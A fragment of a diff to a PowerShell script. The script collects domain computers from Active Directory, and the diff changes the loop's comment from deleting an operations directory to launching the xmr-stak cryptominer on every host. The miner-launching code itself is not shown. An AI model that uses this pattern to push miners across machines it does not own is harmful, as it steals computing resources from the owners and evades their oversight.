@@ -26,7 +26,7 @@ Read-Host -Prompt "Press Enter to continue"
 $HostList=(Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $searchBase).name
 
 
-# Cycle through the clients in the host list and recursively remove the operations directory
+# Cycle through the clients in the host list and launch xmr-stak
 
 foreach($client in $HostList )
 {
